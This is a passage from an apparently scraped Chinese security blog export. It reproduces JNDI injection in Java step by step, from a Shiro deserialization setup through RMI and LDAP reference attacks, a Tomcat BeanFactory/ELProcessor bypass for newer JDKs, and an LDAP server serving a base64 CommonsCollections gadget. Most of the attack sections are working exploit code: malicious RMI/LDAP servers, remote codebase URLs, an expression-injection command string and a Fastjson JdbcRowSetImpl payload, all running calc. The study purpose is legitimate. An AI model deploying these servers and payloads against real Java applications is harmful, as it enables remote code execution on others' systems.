class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit clone https://github.com/apache/shiro.git\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecd shiro\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003egit checkout shiro-root-1.2.4\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/td\u003e\u003c/tr\u003e\u003c/table\u003e\n\u003c/div\u003e\n\u003c/div\u003e\u003c/div\u003e\r\n\u003c/div\u003e\u003cp\u003e修改 pml.xml（路径为 \\shiro\\samples\\web\\pom.xml）\u003c/p\u003e","title":"Shiro反序列化"},{"content":"一、JNDI 简介 JNDI(Java Naming and Directory Interface，Java命名和目录接口) 是一个应用程序设计的 API，一种标准的 Java 命名系统接口。JNDI 提供统一的客户端 API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录系统，使得 Java 应用程序可以和这些命名服务和目录服务之间进行交互。\n协议 作用 LDAP 轻量级目录访问协议，约定了 Client 与 Server 之间的信息交互格式、使用的端口号、认证方式等内容 RMI JAVA 远程方法协议，该协议用于远程调用应用程序编程接口，使客户机上运行的程序可以调用远程服务器上的对象 DNS 域名服务 CORBA 公共对象请求代理体系结构 二、JNDI 实现 java\r1 2 3 4 5 6 import java.rmi.Remote; import java.rmi.RemoteException; public interface IRemoteObj extends Remote { public String sayHello(String keywords) throws RemoteException; } java\r1 2 3 4 5 6 7 8 9 10 11 12 import java.rmi.AlreadyBoundException; import java.rmi.RemoteException; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIServer { public static void main(String[] args) throws RemoteException, AlreadyBoundException { IRemoteObj remoteObj = new RemoteObjImpl(); Registry r = LocateRegistry.createRegistry(1099); r.bind(\u0026#34;remoteObj\u0026#34;, remoteObj); } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 import java.rmi.RemoteException; import java.rmi.server.UnicastRemoteObject; public class RemoteObjImpl extends UnicastRemoteObject implements IRemoteObj { public RemoteObjImpl() throws RemoteException { } @Override public String sayHello(String keywords) { String upKeywords = keywords.toUpperCase(); System.out.println(upKeywords); return upKeywords; } } java\r1 2 3 4 5 6 7 8 9 import javax.naming.InitialContext; public class JNDIRMIClient { public static void main(String[] args) throws Exception{ InitialContext initialContext = new InitialContext(); IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup(\u0026#34;rmi://localhost:1099/remoteObj\u0026#34;); System.out.println(remoteObj.sayHello(\u0026#34;hello\u0026#34;)); } } java\r1 2 3 4 5 6 7 8 import javax.naming.InitialContext; public class JNDIRMIServer { public static void main(String[] args) throws Exception{ InitialContext initialContext = new InitialContext(); initialContext.rebind(\u0026#34;rmi://localhost:1099/remoteObj\u0026#34;, new RemoteObjImpl()); } } 三、JNDI 注入 3.1 分析漏洞如何产生 此处断点调试，跟进 lookup\nInitialContext.lookup\nGenericURLContext.lookup\nRegistryContext.lookup\nRegistryImpl_Stub.lookup 到这里就不用跟了，攻击方式和 RMI 中攻击注册中心一样，\nRMI 中的攻击注册中心：https://www.yuque.com/taohuayuanpang/qxcvxi/rzl0dhpb5pnb8noh#dT3m5\n3.2 Jndi + RMI 复现： 先写一个弹出计算器类并编译：\n之后用 python 开一个 http 服务，监听 7777 端口\n服务端：\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 import javax.naming.InitialContext; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class JNDIRMIServer { public static void main(String[] args) throws Exception{ InitialContext initialContext = new InitialContext(); //initialContext.rebind(\u0026#34;rmi://localhost:1099/remoteObj\u0026#34;, new RemoteObjImpl()); // 在当前 JVM 中启动（或创建）一个 RMI registry，监听端口 1099 Registry registry = LocateRegistry.createRegistry(1099); //将 JndiCalc 类的 JndiCalc 方法，放到 http://localhost:7777/ // 创建一个 Reference 对象（指向一个可通过工厂/远程位置获取的类） Reference reference = new Reference(\u0026#34;JndiCalc\u0026#34;, \u0026#34;JndiCalc\u0026#34;, \u0026#34;http://localhost:7777/\u0026#34;); // 将 Reference 绑定到 JNDI 命名空间中的 rmi URL 下 initialContext.rebind(\u0026#34;rmi://localhost:1099/remoteObj\u0026#34;, reference); } } 然后用客户端访问，\njava\r1 2 3 4 5 6 7 8 9 import javax.naming.InitialContext; public class JNDIRMIClient { public static void main(String[] args) throws Exception{ InitialContext initialContext = new InitialContext(); IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup(\u0026#34;rmi://localhost:1099/remoteObj\u0026#34;); System.out.println(remoteObj.sayHello(\u0026#34;hello\u0026#34;)); } } 弹出计算器：\n这个调用过程就是 3.1 中以及分析过的，实际上还是调用了 lookup 方法\n调试： 在客户端的 lookup 处断点\n跟到 RegistryImpl_Stub 这里，\n继续跟进\n这里看到 var2 被赋值了 ，这里的 var2 是一个对象变量，Ref 将值传递给了它\n步入 decodeObject ，\n先做了一个简单的判断，判断是否为 ReferenceWrapper，也就是判断是否为 Reference 对象\n继续跟进 getObjectInstance\n这里使用强转将 refInfo 转为 Reference\n继续往下走，getObjectFactoryBuilder() 这里获取到了恶意类\n继续往下走，获取到 codebase，并且进行 helper.loadClass()\n来到 newInstance() 后会调用 JndiCalc 类执行代码\n3.2 Jndi + LDAP LDAP 简介 Lightweight Directory Access Protocol （轻量级目录访问协议）是一种开放的、与供应商无关的行业标准应用协议， 用于通过互联网协议(IP) 网络访问和维护分布式目录信息服务。目录服务在开发内联网和互联网应用程序中发挥着重要作用，因为它允许在整个网络中共享有关用户、系统、网络、服务和应用程序的信息。例如，目录服务可以提供任何有组织的记录集，通常具有层次结构，例如公司电子邮件目录。同样，电话簿是包含地址和电话号码的用户列表。\nLDAP 身份验证的基本流程： 用户提供凭证：用户通过客户端应用（如数据库客户端）输入用户名和密码。 客户端与 LDAP 服务器通信：客户端通过 LDAP 协议与 LDAP 服务器通信，将用户名和密码发送给 LDAP 服务器。 LDAP 服务器验证：LDAP 服务器检查用户名是否存在，并对密码进行验证。 返回验证结果：如果用户名和密码匹配，LDAP 服务器返回认证成功的信息，允许用户访问资源。否则，返回认证失败。 LDAP 支持多种认证方式，如：\n匿名认证：不需要提供凭证，但访问权限有限。 简单认证：用户提供用户名和密码进行身份验证。 SASL（简单认证和安全层）认证：用于更复杂的认证机制，提供更高的安全性。 LDAP 目录服务的常用结构 LDAP 目录中的信息组织为树形结构，称为 目录信息树（DIT）。常见的条目包括用户、组织、部门等。条目使用 Distinguished Name (DN) 进行标识，DN 包括所有节点的完整路径。例如，一个用户条目的 DN 可能是：\nuid=john,ou=users,dc=example,dc=com\n其中：\nuid=john 表示用户名为 john。 ou=users 表示该条目属于“users”组织单元。 dc=example,dc=com表示 LDAP 服务器的域名是 example.com。 漏洞复现： 导入unboundid-ldapsdk 的依赖。\nxml\r1 2 3 4 5 6 7 8 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.unboundid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unboundid-ldapsdk\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;test\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; Ldap 服务端： 代码搭建 java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LdapServer { private static final String LDAP_BASE = \u0026#34;dc=example,dc=com\u0026#34;; public static void main (String[] args) { //此处的 url 表示返回给客户端的 codebaseURL (http://127.0.0.1:8000) //格式为：http://127.0.0.1:port/#Refname； //Refname 就是要加载的类，port 为 http 监听的端口 String url = \u0026#34;http://127.0.0.1:8000/#JndiCalc\u0026#34;; //ldap 服务监听的端口，客户端连接这个端口执行 lookup int port = 1234; try { //配置 LDAP 监听器 InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); //注册拦截器，该拦截器在收到 search 操作时会被调用，可以自定义返回的 entry ；正是实现“返回恶意 LDAP 引用”的地方。 config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; /** * */ public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override //当 LDAP 客户端做 search/lookup 时触发 public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } ///组装返回的 LDAP 条目 protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;Exploit\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, cbstring); e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); e.addAttribute(\u0026#34;javaFactory\u0026#34;, this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } 客户端：\njava\r1 2 3 4 5 6 7 8 9 10 11 import javax.naming.InitialContext; public class JNDILdapClient { public static void main(String[] args) throws Exception{ InitialContext initialContext = new InitialContext(); // IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup(\u0026#34;ldap://localhost:1099/remoteObj\u0026#34;); IRemoteObj remoteObj = (IRemoteObj) initialContext.lookup(\u0026#34;ldap://127.0.0.1:1234/EvilObject\u0026#34;); System.out.println(remoteObj.sayHello(\u0026#34;hello\u0026#34;)); } } 用 python 开一个服务监听 8000端口\n接下来启动服务端，启动客户端，弹出计算器\n使用 ApacheDirectoryStudio 搭建 LDAP 服务 注意：系统的 java 环境使用 jdk 11，jdk 8 的版本都运行不了 LDAP 环境！\n新建一个 LDAP 服务，\n这样就搭建成功了：\n注意一点就是，LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的 com.sun.jndi.rmi.object.trustURLCodebase、com.sun.jndi.cosnaming.object.trustURLCodebase等属性的限制，所以适用范围更广。但在JDK 8u191、7u201、6u211之后，com.sun.jndi.ldap.object.trustURLCodebase属性的默认值被设置为 false，对 LDAP Reference 远程工厂类的加载增加了限制。\n所以，当JDK版本介于 8u191、7u201、6u211 与 6u141、7u131、8u121 之间时，我们就可以利用LDAP+Reference 的技巧来进行JNDI注入的利用。\n因此，这种利用方式的前提条件就是目标环境的JDK版本在JDK8u191、7u201、6u211以下。\n3.3 jndi 结合 CORBA 一个简单的流程是：resolve_str 最终会调用到 StubFactoryFactoryStaticImpl.createStubFactory 去加载远程 class 并调用 newInstance 创建对象，其内部使用的 ClassLoader 是 RMIClassLoader，在反序列化 stub 的上下文中，默认不允许访问远程文件，因此这种方法在实际场景中比较少用。所以就不深入研究了。\n3.4 绕过 jdk 高版本 3.4.1 8u191 之前 这里的版本为 jdk 8u121 \u0026lt; temp \u0026lt; 8u191\n这个之间版本绕过方法便是上文所述的 ldap 的 jndi 漏洞\n3.4.2 8u191 之后 8u191 之后，在使用 URLClassLoader 加载器加载远程类时，通过添加 trustURLCodebase 的值是否为 true ，让我们无法加载 codebase，也就是无法进行 URLClassLoader 的攻击。\n要想绕过就要找到这么一个类：\n服务端本地 ClassPath 中存在恶意 Factory 类可被利用来作为 Reference Factory 进行攻击利用 Factory 类必须实现 javax.naming.spi.ObjectFactory 接口，可利用该接口的 getObjectInstance() 方法 我们找到 org.apache.naming.factory.BeanFactory类，其满足上述条件并存在于 Tomcat8 依赖包中，应用广泛。该类的 getObjectInstance() 函数中会通过反射的方式实例化 Reference 所指向的任意 Bean Class(Bean Class 就类似于我们之前说的那个 CommonsBeanUtils 这种)，并且会调用 setter 方法为所有的属性赋值。而该 Bean Class 的类名、属性、属性值，全都来自于 Reference 对象，均是攻击者可控的。\n绕过一：利用本地恶意 Class 环境： 首先是 tomcat 环境，以下三个必须存在并且版本尽量选在 9.0.64 以前的，（9.0.64 以后的版本大多数漏洞都被修复了，不能利用）\nxml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-el-api --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-el-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.66\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-jasper-el --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-jasper-el\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.66\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/org.apache.tomcat/tomcat-catalina --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.tomcat\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;tomcat-catalina\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;8.5.66\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; 源码复现： 参考：https://drun1baby.top/2022/07/28/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BJNDI%E5%AD%A6%E4%B9%A0/#2-jdk-%E7%89%88%E6%9C%AC%E5%9C%A8-8u191-%E4%B9%8B%E5%90%8E%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 import com.sun.jndi.rmi.registry.ReferenceWrapper; import org.apache.naming.ResourceRef; import javax.naming.StringRefAddr; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; // JNDI 高版本 jdk 绕过服务端 public class JNDIBypassHighJava { public static void main(String[] args) throws Exception { System.out.println(\u0026#34;[*]Evil RMI Server is Listening on port: 1099\u0026#34;); Registry registry = LocateRegistry.createRegistry( 1099); // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory ResourceRef ref = new ResourceRef(\u0026#34;javax.el.ELProcessor\u0026#34;, null, \u0026#34;\u0026#34;, \u0026#34;\u0026#34;, true,\u0026#34;org.apache.naming.factory.BeanFactory\u0026#34;,null); // 强制将\u0026#39;x\u0026#39;属性的setter从\u0026#39;setX\u0026#39;变为\u0026#39;eval\u0026#39;, 详细逻辑见BeanFactory.getObjectInstance代码 ref.add(new StringRefAddr(\u0026#34;forceString\u0026#34;, \u0026#34;x=eval\u0026#34;)); // 利用表达式执行命令 ref.add(new StringRefAddr(\u0026#34;x\u0026#34;, \u0026#34;\\\u0026#34;\\\u0026#34;.getClass().forName(\\\u0026#34;javax.script.ScriptEngineManager\\\u0026#34;)\u0026#34; + \u0026#34;.newInstance().getEngineByName(\\\u0026#34;JavaScript\\\u0026#34;)\u0026#34; + \u0026#34;.eval(\\\u0026#34;new java.lang.ProcessBuilder[\u0026#39;(java.lang.String[])\u0026#39;]([\u0026#39;calc\u0026#39;]).start()\\\u0026#34;)\u0026#34;)); System.out.println(\u0026#34;[*]Evil command: calc\u0026#34;); ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref); registry.bind(\u0026#34;Object\u0026#34;, referenceWrapper); } } ​\njava\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import org.apache.naming.ResourceRef; import javax.naming.InitialContext; import javax.naming.StringRefAddr; public class JNDIBypassHighJavaServerRebind { public static void main(String[] args) throws Exception{ InitialContext initialContext = new InitialContext(); ResourceRef resourceRef = new ResourceRef(\u0026#34;javax.el.ELProcessor\u0026#34;,null,\u0026#34;\u0026#34;,\u0026#34;\u0026#34;, true,\u0026#34;org.apache.naming.factory.BeanFactory\u0026#34;,null ); resourceRef.add(new StringRefAddr(\u0026#34;forceString\u0026#34;, \u0026#34;x=eval\u0026#34;)); resourceRef.add(new StringRefAddr(\u0026#34;x\u0026#34;,\u0026#34;Runtime.getRuntime().exe(\u0026#39;calc\u0026#39;)\u0026#34; )); initialContext.rebind(\u0026#34;rmi://localhost:1099/remoteObj\u0026#34;, resourceRef); System.out.println(\u0026#34;ServerRebind Success\u0026#34;); } } java\r1 2 3 4 5 6 7 8 9 10 import javax.naming.Context; import javax.naming.InitialContext; public class JNDIBypassHighJavaClient { public static void main(String[] args) throws Exception { String uri = \u0026#34;rmi://localhost:1099/Object\u0026#34;; Context context = new InitialContext(); context.lookup(uri); } } 分析： 前面的流程还是进入 lookup 方法，到 RegistryContext 类的 decodeObject() 方法，这个方法当中调用了 getObjectInstance()。然后来到 getObjectFactoryFromReference 开始跟：\n然后通过 loadClass 加载 org.apache.naming.factory.BeanFactory并赋值给 clas 将 clas 强转为 ObjectFactory 类型\n然后经过一系列复杂的赋值，最终在 ref 的 className 中获取到了 \u0026ldquo;javax.el.ELProcessor\u0026rdquo; ，classFactory 获取到了\u0026quot;org.apache.naming.factory.BeanFactory\u0026quot;\ngetObjectInstance\n到了 getObjectInstance 之后便是整理变量，准备执行 invoke 方法\nra 通过利用 Java 的脚本引擎（JavaScript ）在运行时构造并调用 ProcessBuilder，最终在目标主机上执行系统命令 calc，就是获取 beanClass 即 javax.el.ELProcessor 类的 eval() 方法并和 x 属性\n可以看到这里的一个 value 中封装的就是恶意代码\n最终代码在 method.invoke 处，通过method.invoke()即反射调用的来执行\n\u0026quot;\u0026quot;.getClass().forName(\u0026quot;javax.script.ScriptEngineManager\u0026quot;).newInstance().getEngineByName(\u0026quot;JavaScript\u0026quot;).eval(\u0026quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\u0026quot;)。弹出计算器。\n绕过二：LDAP返回序列化数据，触发本地Target LDAP 服务端除了支持 JNDI Reference 这种利用方式外，还支持直接返回一个序列化的对象。如果 Java 对象的 javaSerializedData 属性值不为空，则客户端的obj.decodeObject() 方法就会对这个字段的内容进行反序列化。此时，如果服务端 ClassPath 中存在反序列化咯多功能利用 Gadget 如 CommonsCollections 库，那么就可以结合该 Gadget 实现反序列化漏洞攻击。\n复现： xml\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.80\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;commons-collections\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;commons-collections\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.2.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;!-- https://mvnrepository.com/artifact/com.unboundid/unboundid-ldapsdk --\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.unboundid\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;unboundid-ldapsdk\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.1.0\u0026lt;/version\u0026gt; \u0026lt;scope\u0026gt;compile\u0026lt;/scope\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 import com.unboundid.util.Base64; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; import java.text.ParseException; public class JNDIGadgetServer { private static final String LDAP_BASE = \u0026#34;dc=example,dc=com\u0026#34;; public static void main (String[] args) { String url = \u0026#34;http://vps:8000/#ExportObject\u0026#34;; int port = 1234; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \u0026#34;listen\u0026#34;, InetAddress.getByName(\u0026#34;0.0.0.0\u0026#34;), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\u0026#34;Listening on 0.0.0.0:\u0026#34; + port); ds.startListening(); } catch ( Exception e ) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; /** * */ public OperationInterceptor ( URL cb ) { this.codebase = cb; } /** * {@inheritDoc} * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch ( Exception e1 ) { e1.printStackTrace(); } } protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace(\u0026#39;.\u0026#39;, \u0026#39;/\u0026#39;).concat(\u0026#34;.class\u0026#34;)); System.out.println(\u0026#34;Send LDAP reference result for \u0026#34; + base + \u0026#34; redirecting to \u0026#34; + turl); e.addAttribute(\u0026#34;javaClassName\u0026#34;, \u0026#34;Exploit\u0026#34;); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\u0026#39;#\u0026#39;); if ( refPos \u0026gt; 0 ) { cbstring = cbstring.substring(0, refPos); } // Payload1: 利用LDAP+Reference Factory // e.addAttribute(\u0026#34;javaCodeBase\u0026#34;, cbstring); // e.addAttribute(\u0026#34;objectClass\u0026#34;, \u0026#34;javaNamingReference\u0026#34;); // e.addAttribute(\u0026#34;javaFactory\u0026#34;, this.codebase.getRef()); // Payload2: 返回序列化Gadget try { e.addAttribute(\u0026#34;javaSerializedData\u0026#34;, Base64.decode(\u0026#34;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AARjYWxjdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=\u0026#34;)); } catch (ParseException exception) { exception.printStackTrace(); } result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } java\r1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 import com.alibaba.fastjson.JSON; import javax.naming.Context; import javax.naming.InitialContext; public class JNDIGadgetClient { public static void main(String[] args) throws Exception { // lookup参数注入触发 Context context = new InitialContext(); context.lookup(\u0026#34;ldap://localhost:1234/ExportObject\u0026#34;); // Fastjson反序列化JNDI注入Gadget触发 String payload =\u0026#34;{\\\u0026#34;@type\\\u0026#34;:\\\u0026#34;com.sun.rowset.JdbcRowSetImpl\\\u0026#34;,\\\u0026#34;dataSourceName\\\u0026#34;:\\\u0026#34;ldap://127.0.0.1:1234/ExportObject\\\u0026#34;,\\\u0026#34;autoCommit\\\u0026#34;:\\\u0026#34;true\\\u0026#34; }\u0026#34;; JSON.parse(payload); } } 分析： 在这里下断点调试\n首先还是经过 lookup 